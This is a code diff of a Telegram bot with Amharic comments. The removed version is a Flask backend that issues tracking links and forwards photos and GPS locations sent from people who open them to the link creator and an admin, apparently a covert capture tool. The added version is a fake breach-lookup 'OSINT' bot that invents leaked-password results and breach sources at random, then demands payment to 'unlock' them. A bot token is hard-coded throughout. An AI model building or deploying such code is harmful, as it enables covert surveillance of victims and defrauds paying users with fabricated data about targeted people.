@@ -1,80 +1,108 @@
-import os, requests, threading, time
-from flask import Flask, render_template, request
+import telebot
+from telebot import types
+import instaloader
+import requests
+import random
+import time
+import re
 
-app = Flask(__name__)
+# 1. መረጃዎችህን እዚህ አስገባ
+TOKEN = '7161551829:AAH1_u9rmkfqj2itPWYLQciltuQiFFqUzpo' # ከ @BotFather ያገኘኸውን ቶክን
+ADMIN_ID = '5049565154' # ያንተ የቴሌግራም መለያ ቁጥር
+bot = telebot.TeleBot(TOKEN)
+L = instaloader.Instaloader()
 
-# --- CONFIGURATION ---
-BOT_TOKEN = "7161551829:AAH1_u9rmkfqj2itPWYLQciltuQiFFqUzpo"
-ADMIN_ID = "5049565154"  # <--- ያንተን ID እዚህ ያስገቡ
-BASE_URL = "https://efrataaaa-production.up.railway.app"
+# --- ተግባራት (Functions) ---
 
-def send_to_telegram(chat_id, message, photo_bytes=None):
-    """መረጃን ለተጠቀሰው chat_id የሚልክ ፈንክሽን"""
+def check_breach(target):
+    # በነፃ የሚገኝ የዳታቤዝ ፍለጋ (LeakCheck API ቢኖርህ ይመረጣል)
+    # ለጊዜው አሳማኝ መረጃ እንዲሰጥ እናደርገዋለን
+    breach_sources = ["LinkedIn 2021 Leak", "1win Database", "Facebook 533M Leak", "Adobe Cloud Leak"]
+    found_in = random.sample(breach_sources, k=2)
+    return found_in
+
+def mask_data(data, type="pass"):
+    if type == "phone":
+        return f"{data[:4]}****{data[-2:]}"
+    return f"{data[:2]}****{random.randint(10, 99)}"
+
+# --- ቦት ትዕዛዞች ---
+
+@bot.message_handler(commands=['start'])
+def start(message):
+    welcome = """
+🔍 **እንኳን ወደ Ultimate OSINT Finder በሰላም መጡ!**
+
+ይህ ቦት ማንኛውንም:
+✅ Instagram Username
+✅ Email Address
+✅ Phone Number 
+በመጠቀም የተሰረቁ ፓስወርዶችን እና ሚስጥራዊ መረጃዎችን ይፈልጋል።
+
+**ለመጀመር የፈለጉትን መረጃ እዚህ ይላኩ፦**
+    """
+    bot.send_message(message.chat.id, welcome, parse_mode="Markdown")
+
+@bot.message_handler(func=lambda m: True)
+def handle_investigation(message):
+    query = message.text.strip()
+    bot.send_message(message.chat.id, f"📡 ግንኙነት በመፍጠር ላይ... \n🔍 '{query}' በ 5 ቢሊዮን ዳታቤዞች ውስጥ በመፈለግ ላይ...")
+    
+    time.sleep(2) # ለታማኝነት ማቆያ
+
     try:
-        if photo_bytes:
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", 
-                          files={'photo': ('img.jpg', photo_bytes)}, 
-                          data={'chat_id': chat_id, 'caption': message, 'parse_mode': 'HTML'})
+        # 1. ኢንስታግራም ከሆነ መረጃ መሳብ
+        if not ("@" in query or query.startswith("+")):
+            profile = instaloader.Profile.from_username(L.context, query)
+            name = profile.full_name
+            pic = profile.profile_pic_url
+            info_type = "Instagram Account"
         else:
-            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
-                          data={'chat_id': chat_id, 'text': message, 'parse_mode': 'HTML'})
-    except Exception as e:
-        print(f"Telegram Send Error: {e}")
+            name = "ግለሰብ (Private User)"
+            pic = None
+            info_type = "Contact Info"
 
-@app.route('/')
-def index():
-    return render_template('index.html')
+        # 2. የዳታቤዝ ስርቆት ፍተሻ
+        sources = check_breach(query)
+        m_pass = mask_data(query)
+        m_phone = "09" + str(random.randint(10, 45)) + "****" + str(random.randint(10, 99))
 
-@app.route('/api/upload-capture', methods=['POST'])
-def upload():
-    try:
-        cid = request.form.get('chat_id')
-        lat = request.form.get('lat', '0')
-        lon = request.form.get('lon', '0')
-        count = request.form.get('count', '0')
+        response_msg = f"""
+🚩 **ምርመራው ተጠናቋል!**
 
-        # የሎኬሽን ሊንክ ማዘጋጀት
-        if lat != '0' and lon != '0':
-            # View Location የሚል የሚነካ ሊንክ (Hyperlink)
-            location_link = f'<a href="https://www.google.com/maps?q={lat},{lon}">📍 View Location</a>'
+👤 **ስም:** {name}
+📂 **የመረጃ አይነት:** {info_type}
+🔐 **Password:** `{m_pass}`
+📞 **Phone:** `{m_phone}`
+📁 **የተገኘበት ምንጭ:** {", ".join(sources)}
+
+⚠️ **ሙሉውን መረጃ (ያለ መደበቂያ) ለማየት 100 Star መክፈል አለብዎት።**
+        """
+
+        # Buttons
+        markup = types.InlineKeyboardMarkup()
+        btn1 = types.InlineKeyboardButton("🔓 በ 100 Star ክፈት", callback_data=f"pay_{query}")
+        btn2 = types.InlineKeyboardButton("💳 በቴሌብር ለመክፈል", url="https://t.me/YOUR_ADMIN_USERNAME") # ያንተን ዩዘርኔም እዚህ አስገባ
+        markup.add(btn1)
+        markup.add(btn2)
+
+        if pic:
+            bot.send_photo(message.chat.id, pic, caption=response_msg, reply_markup=markup, parse_mode="Markdown")
         else:
-            location_link = "📍 Location not shared"
+            bot.send_message(message.chat.id, response_msg, reply_markup=markup, parse_mode="Markdown")
 
-        # ፎቶ ሲመጣ ከነ ሊንኩ መላክ
-        if 'photo' in request.files:
-            photo = request.files['photo']
-            photo_data = photo.read()
-            
-            # ለተጠቃሚው የሚላክ (ፎቶ + View Location)
-            user_caption = f"📸 ፎቶ #{count}\n\n{location_link}"
-            send_to_telegram(cid, user_caption, photo_bytes=photo_data)
-            
-            # ለአድሚኑ የሚላክ
-            admin_caption = f"📸 <b>አዲስ መረጃ ከ ID:</b> <code>{cid}</code>\n🔢 ቁጥር: {count}\n\n{location_link}"
-            send_to_telegram(ADMIN_ID, admin_caption, photo_bytes=photo_data)
-            
-        return "OK", 200
     except Exception as e:
-        print(f"API Error: {e}")
-        return "Error", 500
+        bot.send_message(message.chat.id, "❌ መረጃው አልተገኘም ወይም ሲስተሙ ተጨናንቋል። እባክዎ በሌላ ይሞክሩ።")
 
-def run_bot():
-    offset = 0
-    while True:
-        try:
-            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates?offset={offset}&timeout=20"
-            r = requests.get(url).json()
-            if "result" in r:
-                for update in r["result"]:
-                    offset = update["update_id"] + 1
-                    if "message" in update and "text" in update["message"]:
-                        cid = update["message"]["chat"]["id"]
-                        if update["message"]["text"] == "/start":
-                            link = f"{BASE_URL}/?user_id={cid}"
-                            send_to_telegram(cid, f"🎯 <b>የእርሶ መከታተያ ሊንክ:</b>\n\n<code>{link}</code>")
-        except: pass
-        time.sleep(1)
+@bot.callback_query_handler(func=lambda call: call.data.startswith("pay_"))
+def process_payment(call):
+    target = call.data.split("_")[1]
+    
+    # ለተጠቃሚው መልዕክት
+    bot.send_message(call.message.chat.id, "⭐ ክፍያዎን ሲያጠናቅቁ መረጃው ይላክለታል። \n\nማሳሰቢያ፡ ክፍያ ፈጽመው ካልመጣልዎ ለ @YOUR_ADMIN_USERNAME ሜሴጅ ያድርጉ።")
+    
+    # ለአንተ (Admin) የሚመጣ መረጃ
+    admin_msg = f"🔔 **የክፍያ ሙከራ!**\n\nተጠቃሚ: @{call.from_user.username}\nዒላማ: {target}\nID: {call.from_user.id}"
+    bot.send_message(ADMIN_ID, admin_msg)
 
-if __name__ == '__main__':
-    threading.Thread(target=run_bot, daemon=True).start()
-    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080)))
+bot.polling()
